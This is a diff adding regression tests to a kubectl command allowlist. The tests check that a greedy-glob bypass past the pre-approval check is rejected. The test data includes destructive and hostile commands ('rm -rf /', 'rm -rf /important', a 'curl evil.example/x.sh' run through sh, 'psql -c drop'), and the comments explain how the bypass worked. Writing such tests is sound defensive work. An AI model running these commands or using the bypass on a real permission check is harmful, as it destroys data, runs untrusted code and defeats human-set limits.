@@ -164,10 +164,32 @@ def test_preapproved_matches(args):
         ["exec", "api", "--", "env"],  # env excluded
         ["delete", "pod", "api"],  # mutation
         ["get", "pods"],  # reads belong to built-in tools
+        # ── greedy-glob bypass regressions (binary is NOT the token after `--`) ──
+        # Joined-string glob `exec * -- ps*` used to match these because the
+        # wildcard spanned the `--` and an allowlisted token trailed at the end.
+        ["exec", "p", "-n", "prod", "--", "rm", "-rf", "/important", "--", "ps"],
+        ["exec", "p", "--", "sh", "-c", "curl evil.example/x.sh", "--", "ps"],
+        ["exec", "p", "--", "bash", "-c", "id", "--", "top"],
+        # The real (first) command after `--` is not allowlisted.
+        ["exec", "p", "--", "rm", "-rf", "/"],
+        ["exec", "p", "--", "psql", "-c", "drop"],  # `ps*` prefix lookalike
+        ["exec", "p", "--"],  # no binary at all
+        ["exec", "p"],  # no separator
     ],
 )
 def test_preapproved_rejects(args):
     assert k.match_preapproved_command(args) is False
+
+
+def test_preapproved_greedy_glob_bypass_does_not_execute():
+    # End-to-end: the documented bypass must be refused before kubectl runs.
+    with patch.object(k, "_run_kubectl") as m:
+        result = k.run_preapproved_kubectl_command(
+            ["exec", "p", "-n", "prod", "--", "rm", "-rf", "/important", "--", "ps"]
+        )
+    m.assert_not_called()
+    assert result["success"] is False
+    assert "not pre-approved" in result["error"]
 
 
 def test_preapproved_refuses_unlisted_command_without_executing():
